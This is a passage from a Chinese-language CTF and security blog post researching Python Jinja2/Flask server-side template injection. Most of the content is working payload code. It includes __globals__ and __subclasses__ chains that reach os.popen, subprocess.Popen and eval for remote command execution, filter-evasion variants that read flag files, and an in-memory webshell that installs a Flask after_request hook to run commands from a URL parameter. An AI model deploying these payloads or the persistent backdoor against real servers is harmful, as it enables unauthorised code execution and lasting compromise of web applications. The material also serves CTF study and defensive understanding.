<h4 id="由lipsum构造payload"><span class="me-2">由<code class="language-plaintext highlighter-rouge">lipsum</code>构造Payload</span><a href="#由lipsum构造payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>对于<code class="language-plaintext highlighter-rouge">lipsum</code>，当我们在注入点输入<code class="language-plaintext highlighter-rouge">{{lipsum}}</code>时可以得到回显：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, &lt;function generate_lorem_ipsum at 0x7f91fe6951c0&gt;.
</pre></td></tr></tbody></table></code></div></div>

<p>这代表我们利用的是一个全局的函数对象。那么对于函数对象就可以直接使用<code class="language-plaintext highlighter-rouge">__globals__</code>这个魔术属性获取全局上下文，我们编写<code class="language-plaintext highlighter-rouge">{{lipsum.__globals__}}</code>得到回显：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>Hi, {'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f91fe676840&gt;, '__spec__': ModuleSpec(name='jinja2.utils', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x7f91fe676840&gt;, origin='/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/utils.py'), '__file__': '/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/utils.py', '__cached__': '/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/__pycache__/utils.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': 
...
function vars&gt;, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': &lt;class 'bool'&gt;, 'memoryview': &lt;class 'memoryview'&gt;, 'bytearray': &lt;class 'bytearray'&gt;, 'bytes': &lt;class 'bytes'&gt;, 'classmethod': &lt;class 'classmethod'&gt;, 'complex': &lt;class 'complex'&gt;, 'dict': &lt;class 'dict'&gt;, 'enumerate': &lt;class 'enumerate'&gt;, 'filter': &lt;class 'filter'&gt;, 'float': &lt;class 'float'&gt;, 'frozenset': &lt;class 'frozenset'&gt;, 'property': &lt;class 'property'&gt;, 'int': &lt;class 'int'&gt;, 'list': &lt;class 'list'&gt;, 'map': &lt;class 'map'&gt;, 'object': &lt;class 'object'&gt;, 'range': &lt;class 'range'&gt;, 'reversed': &lt;class 'reversed'&gt;, 'set': &lt;class 'set'&gt;, 'slice
...
, file "/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/runtime.py", line 852&gt;, &lt;code object compile at 0x7f91fe6481f0, file "/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/environment.py", line 731&gt;}, 'concat': &lt;built-in method join of str object at 0xb3c770&gt;, 'pass_context': &lt;function pass_context at 0x7f91fe6947c0&gt;, 'pass_eval_context': &lt;function pass_eval_context at 0x7f91fe6949a0&gt;, 'pass_environment': &lt;function pass_environment at 0x7f91fe694a40&gt;, '_PassArg': &lt;enum '_PassArg'&gt;, 'internalcode': &lt;f
...
</pre></td></tr></tbody></table></code></div></div>

<p>许多Web框架会隐式导入<code class="language-plaintext highlighter-rouge">os</code>模块，用于处理文件路径、环境变量等，在一般情况下如果我们能在global中发现：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>'os': &lt;module 'os' (frozen)&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>就说明我们可以利用<code class="language-plaintext highlighter-rouge">os</code>模块，紧接着我们就可以调用os模块，因为这个魔术属性<code class="language-plaintext highlighter-rouge">__globals__</code>是字典，所以我们可以<code class="language-plaintext highlighter-rouge">{{lipsum.__globals__['os']}}</code>或者<code class="language-plaintext highlighter-rouge">{{lipsum.__globals__.__getitem__('os')}}</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, &lt;module 'os' (frozen)&gt;.
</pre></td></tr></tbody></table></code></div></div>

<p>我们可以通过<code class="language-plaintext highlighter-rouge">{{lipsum.__globals__['os'].__dir__()}}</code>查看可用属性：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>Hi, ['__name__', '__doc__', '
...
awnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'popen', '_wrap_close', 'fdopen', '_fspath', 'PathLike'].
</pre></td></tr></tbody></table></code></div></div>

<p>我们发现了风险函数<code class="language-plaintext highlighter-rouge">popen</code>，于是就有了经典的payload：</p>

<pre><code class="language-jinja2">{{lipsum.__globals__['os'].popen('whoami').read()}}
</code></pre>

<p>注意这里需要<code class="language-plaintext highlighter-rouge">.read()</code>来保证回显。</p>

<p>类似地，我们还可以用全局函数<code class="language-plaintext highlighter-rouge">url_for</code>来构造相同的payload：</p>

<pre><code class="language-jinja2">{{url_for.__globals__.os.popen('ls').read()}}
{{get_flashed_messages.__globals__['os'].popen('dir').read()}}
</code></pre>

<h4 id="由config构造payload"><span class="me-2">由<code class="language-plaintext highlighter-rouge">config</code>构造Payload</span><a href="#由config构造payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>对于<code class="language-plaintext highlighter-rouge">config</code>，当我们在注入点输入<code class="language-plaintext highlighter-rouge">{{config}}</code>时可以得到回显为一长串字符，这根前面的情况都不一样。这是因为config是一个类对象，调用其本身会自动触发to String方法，因此我们可以通过<code class="language-plaintext highlighter-rouge">__class__</code>返回它的类，<code class="language-plaintext highlighter-rouge">{{config.__class__}}</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, &lt;class 'flask.ctx._AppCtxGlobals'&gt;.
</pre></td></tr></tbody></table></code></div></div>

<p>我们依然希望仿照上面的方法，去获取一个函数的<code class="language-plaintext highlighter-rouge">__globals__</code>属性从而得到风险函数，因此我们希望获取一个类中的函数。</p>

<p>一般来说，类有许多自带的魔术方法可以利用，比如<code class="language-plaintext highlighter-rouge">={{config.__class__.__init__}}</code>就会返回：</p>

<pre><code class="language-\">Hi, &lt;function Config.__init__ at 0x7f91fe6304a0&gt;.
</code></pre>

<p>这样我们就有了和上面一样的思路，因此我们构造有payload：</p>

<pre><code class="language-jinja2">{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
</code></pre>

<p>然而很多时候事实并非都如我们所愿，如果我们举一反三，尝试使用其他魔术方法比如<code class="language-plaintext highlighter-rouge">__str__</code>，构造一个payload<code class="language-plaintext highlighter-rouge">{{config.__class__.__str__}}</code>，我们会发现有回显：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, &lt;slot wrapper '__str__' of 'object' objects&gt;.
</pre></td></tr></tbody></table></code></div></div>

<p>这和我们使用init时有显著差异，当我们继续换一个魔术方法<code class="language-plaintext highlighter-rouge">__call__</code>时，<code class="language-plaintext highlighter-rouge">{{config.__class__.__call__}}</code>又会有：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, &lt;method-wrapper '__call__' of type object at 0x1b137e10&gt;.
</pre></td></tr></tbody></table></code></div></div>

<p>如果我们继续在此基础上尝试获取globals属性，结果会发现没有回显。</p>

<p>同样的问题还会出现在其他对象上，根据前一节的研究，还有很多暴露的全局对象，比如<code class="language-plaintext highlighter-rouge">g</code>，当我们试图调用g的init时也会有上述问题。而这是因为，在Python中，带有”wrapper”字样的函数通常是装饰器（decorator）生成的包装函数。这些包装函数在创建时，其<code class="language-plaintext highlighter-rouge">__globals__</code>属性通常指向的是装饰器所在模块的全局字典，而不是原始函数所在模块的全局字典，即使包装函数有自己的<code class="language-plaintext highlighter-rouge">__globals__</code>，它可能并不包含我们期望的模块（比如<code class="language-plaintext highlighter-rouge">os</code>），因为装饰器可能定义在一个与原始函数不同的模块中。</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><strong>类型</strong></th>
      <th><strong>描述</strong></th>
      <th><strong>示例</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">slot wrapper</code></td>
      <td>内置类型的 C 实现方法</td>
      <td><code class="language-plaintext highlighter-rouge">str.strip</code>, <code class="language-plaintext highlighter-rouge">list.append</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">method-wrapper</code></td>
      <td>特殊方法的包装器</td>
      <td><code class="language-plaintext highlighter-rouge">__init__</code>, <code class="language-plaintext highlighter-rouge">__call__</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">builtin_function_or_method</code></td>
      <td>内置函数/方法</td>
      <td><code class="language-plaintext highlighter-rouge">len</code>, <code class="language-plaintext highlighter-rouge">print</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">wrapper_descriptor</code></td>
      <td>描述符协议包装器</td>
      <td><code class="language-plaintext highlighter-rouge">__get__</code>, <code class="language-plaintext highlighter-rouge">__set__</code></td>
    </tr>
  </tbody>
</table></div>

<p>除此之外，一些不需要被用户重写的Python内置方法，比如<code class="language-plaintext highlighter-rouge">__dir__</code>会存在访问受限，因而也不可获取<code class="language-plaintext highlighter-rouge">__globals__</code>。因而在SSTI攻击中，我们通常会避免使用这些包装函数，而是寻找一个普通的、非内置的、非包装的函数来获取<code class="language-plaintext highlighter-rouge">__globals__</code>。</p>

<h4 id="__builtins__的利用"><span class="me-2"><code class="language-plaintext highlighter-rouge">__builtins__</code>的利用</span><a href="#__builtins__的利用" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>在Python中，<code class="language-plaintext highlighter-rouge">__builtins__</code>是一个特殊的模块或字典，它包含了内置的函数、异常和类型。在全局作用域中，<code class="language-plaintext highlighter-rouge">__builtins__</code>通常是对内置命名空间的引用。在大多数Python环境中，<code class="language-plaintext highlighter-rouge">__builtins__</code>是 <code class="language-plaintext highlighter-rouge">builtins</code>模块（Python 3）或 <code class="language-plaintext highlighter-rouge">__builtin__</code>模块（Python 2）的引用。</p>

<p>例如我们希望利用全局类对象request来获取风险函数，很流畅地进入了<code class="language-plaintext highlighter-rouge">{{request.__class__.__init__.__globals__}}</code>，然而我们发现其globals中并不存在os模块。于是我们考虑换一种方式来导入os模块。我们可以发现在globals中的builtins中含有另一个风险函数<code class="language-plaintext highlighter-rouge">eval</code>，我们可以利用eval执行风险python语句从而间接导入os模块，于是就有payload：</p>

<pre><code class="language-jinja2">{{request.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
</code></pre>

<h4 id="一般化payload构造"><span class="me-2">一般化Payload构造</span><a href="#一般化payload构造" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>如果上述的情况都无法使用，我们只好考虑用唯一能获取的对象来曲线救国。我们知道Python的基本数据类型也会有相应的对象，类似地，我们可以有如下方法获得<code class="language-plaintext highlighter-rouge">&lt;class 'Object'&gt;</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>{{0.__class__.__base__}}
{{''.__class__.__bases[0]__}}
{{"".__class__.__mro[0]__}}
{{g.__class__.__base__}}
</pre></td></tr></tbody></table></code></div></div>

<p>接着我们会用到一个特殊的魔术方法以返回Object的所有子类：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{{"".__class__.__bases__[0].__subclasses__()}}
</pre></td></tr></tbody></table></code></div></div>

<p>需要注意的是，这个方法返回的是<strong>数组</strong>而不是<strong>字典</strong>，这意味着我们无法通过键值对的方式访问对应的类，只能通过<strong>数字索引</strong>的方式来获取对应的类。这就是SSTI中最传统的方式，由于每个服务器上Python环境都不同，所以含有风险函数的类的索引也不同，因此我们不能盲目的使用以前的payload。下面给出了一个能够获取数字索引的payload：</p>

<pre><code class="language-jinja2">{% set classes = range.__class__.__base__.__subclasses__() %}
{% for class in classes %}
{{ loop.index0 }}: {{ class.__name__ }} ({{ class.__module__ }})
{% endfor %}
</code></pre>

<p>利用这个payload我们能获取到一些类。</p>

<p>接下来就是获取该类的方法，然后获取该方法的globals属性，观察有无os或者builtins，这是一项浩瀚的工程，可以借助脚本，也可以记住一些常见的能获取到风险函数的类。</p>

<p>例如在我本地执行上述payload后：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>Hi, 0: type (builtins)1: async_generator (builtins)2: bytearray_iterator (builtins)
...
532: StreamWrapper (colorama.ansitowin32)533: AnsiToWin32 (colorama.ansitowin32)534: CompletedProcess (subprocess)535: Popen (subprocess).
</pre></td></tr></tbody></table></code></div></div>

<p>我发现535是Popen，这个类的名字带有强烈的暗示性，所以我选择这个索引并查看它的init方法：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hi, &lt;function Popen.__init__ at 0x7f91fe4528e0&gt;.
</pre></td></tr></tbody></table></code></div></div>

<p>说明它存在globals属性，于是读取globals属性，最终发现os模块，因而有payload：</p>

<pre><code class="language-jinja2">{{range.__class__.__base__.__subclasses__()[535].__init__.__globals__.os.popen("whoami").read()}}
</code></pre>

<p>一般来说，在绝大多数环境下，这些类经常被使用：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>os._wrap_close
warnings.WarningMessage
_frozen_importlib.BuiltinImporter
subprocess.Popen
ctypes.CDLL
codecs.StreamReaderWriter
</pre></td></tr></tbody></table></code></div></div>

<p>讲到此处我们可以触类旁通地发现，SSTI不只有一种方法去执行，如果我们获取的类本身就足够有特点，那么也不必拘泥于常规。</p>

<h4 id="特殊化payload构造"><span class="me-2">特殊化Payload构造</span><a href="#特殊化payload构造" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>以刚刚用过的subprocess.Popen为例，我们可以直接使用这个类创建一个对象，并只需要使用这个类即可：</p>

<pre><code class="language-jinja2">{{''.__class__.__bases__[0].__subclasses__()[535]('ls', shell=True, stdout=-1).communicate()[0]}}
</code></pre>

<p>这样我们就绕过了使用<code class="language-plaintext highlighter-rouge">__globals__</code>，直接利用类特性就实现了RCE。</p>

<p>此外，我还发现在CDLL中存在引入libc直接执行命令的方式：</p>

<pre><code class="language-jinja2">{{range.__class__.__base__.__subclasses__()[526](%27libc.so.6%27).system(%27whoami%27)}}
</code></pre>

<p>然而这种方式似乎因为权限问题或者环境变量问题无法正常使用，需要等待后续研究。</p>

<h3 id="内存马"><span class="me-2">内存马</span><a href="#内存马" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>内存马是一种木马，在含有SSTI的地方选择如下payload可以打上内存马。通常用于网页无回显但可以判定为存在SSTI的时候。</p>

<pre><code class="language-jinja2">{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
</code></pre>

<p>对于这段payload可以拆开解析：</p>

<pre><code class="language-jinja2">{{ 
    url_for.__globals__['__builtins__']['eval'](
        "app.after_request_funcs.setdefault(None, []).append(\n"
        "    lambda resp: \n"
        "        CmdResp if request.args.get('cmd') \n"
        "        and exec(\n"
        "            \"global CmdResp; CmdResp = __import__('flask').make_response(\"\n"
        "            \"__import__('os').popen(request.args.get('cmd')).read())\"\n"
        "        ) == None \n"
        "        else resp\n"
        ")",
        {
            'request': url_for.__globals__['request'],
            'app': url_for.__globals__['current_app']
        }
    ) 
}}
</code></pre>

<p>详情可见：</p>

<p>https://mixbp.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC/</p>

<p>https://xz.aliyun.com/news/13858</p>

<p>https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</p>

<p>https://xz.aliyun.com/news/10381</p>

<h3 id="waf绕过"><span class="me-2">WAF绕过</span><a href="#waf绕过" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>真实环境或者题目环境下会存在许多输入限制，防止你注入，有很多师傅在禁止输入和反禁止输入上有了很多奇技淫巧，叹为观止。前人之述备矣，我的研究也不是很充分，下面是一些比较完善的WAF绕过方法：</p>

<p>https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</p>

<p>https://xz.aliyun.com/news/7341</p>

<p><a href="https://blog.csdn.net/2301_76690905/article/details/134257483">SSTI模板注入详细总结及WAF绕过-CSDN博客</a></p>

<p><code class="language-plaintext highlighter-rouge">''|attr("__class__")</code>等效于<code class="language-plaintext highlighter-rouge">''.__class__</code>，要使用<code class="language-plaintext highlighter-rouge">xxx.os('xxx')</code>类似的方法，可以使用<code class="language-plaintext highlighter-rouge">xxx|attr("os")('xxx')</code>。即<code class="language-plaintext highlighter-rouge">.</code>等价于<code class="language-plaintext highlighter-rouge">|attr()</code></p>

<p>使用flask里的lipsum方法来执行命令：flask里的lipsum方法,可以用于得到<code class="language-plaintext highlighter-rouge">__builtins__</code>，而且<code class="language-plaintext highlighter-rouge">lipsum.__globals__</code>含有os模块</p>

<p>可以得到<code class="language-plaintext highlighter-rouge">lipsum|attr("__globals__")</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{{lipsum.__globals__['os']['popen']('ls').read()}}
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">{% print %}</code> 能在 Flask 模板中输出内容，本质是利用了 Jinja2 允许在 <code class="language-plaintext highlighter-rouge">{% %}</code> 标签中执行 Python 表达式的特性，通过调用 Python 内置的 <code class="language-plaintext highlighter-rouge">print</code> 函数将内容输出到渲染结果中。</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{{"".__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls").read()}}
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{{"".__class__.__base__.__subclasses__()[117].__init__.__globals__['builtins']['eval']("__import__.('os').popen('ls').read()")}}
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{{url_for.__globals__.os.popen('ls').read()}}
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{%print(lipsum|attr("_"+"_glo"+"bals_"+"_")|attr("_"+"_getitem_"+"_")("os")|attr("popen")("cat ../f*")|attr("read")())%}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>request方法绕过：</li>
</ul>

<p>request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>request.args.key  #获取get传入的key的值

request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)

reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get

request.cookies.key  #获取cookies传入参数

request.headers.key  #获取请求头请求参数

request.data  #获取post传入参数(Content-Type:a/b)

request.json  #获取post传入json参数 (Content-Type: application/json)
</pre></td></tr></tbody></table></code></div></div>

<p>payload参考https://www.nssctf.cn/note/set/14423</p>

<p>报错的HTML结构框架：
 Flask：蓝色调试页，显示完整堆栈
 Django：黄色调试页，显示详细设置
 Bottle：仅基础HTML+少量CSS</p>

<h5 id="ghctf-2025message-in-a-bottle"><span class="me-2">[GHCTF 2025]Message in a Bottle</span><a href="#ghctf-2025message-in-a-bottle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>这是个非常好的题，是python意义上的XSS。</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>{% set po=dict(po=a,p=b)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{%print(lipsum|attr(a+a+'glo'+'bals'+a+a)|attr(a+a+'ge'+'titem'+a+a)('o'+'s')|attr('po'+'pen')('tac /f*')|attr('read')())%}
</pre></td></tr></tbody></table></code></div></div>

<p>用于下划线绕过</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/cyber-security/">Cyber Security</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >ctf</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/python/"
            class="post-tag no-text-decoration"
          >python</a>
        
          <a
            href="/tags/flask/"
            class="post-tag no-text-decoration"
          >flask</a>
        
          <a
            href="/tags/jinja2/"
            class="post-tag no-text-decoration"
          >jinja2</a>
        
          <a
            href="/tags/ssti/"
            class="post-tag no-text-decoration"
          >SSTI</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Python%20SSTI%E7%A0%94%E7%A9%B6%20-%20lamaper&url=%2Fposts%2Fpy-ssti%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Python%20SSTI%E7%A0%94%E7%A9%B6%20-%20lamaper&u=%2Fposts%2Fpy-ssti%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2Fpy-ssti%2F&text=Python%20SSTI%E7%A0%94%E7%A9%B6%20-%20lamaper" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CS61A/">UCB CS61A学习笔记</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/bit-ece-stm32/">BIT ECE实习之STM32开发</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/c-in-bit/">一些神奇的C语言题目</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/py-ssti/">Python SSTI研究</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/nodejs-vm-esc/">Node JS沙箱逃逸</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
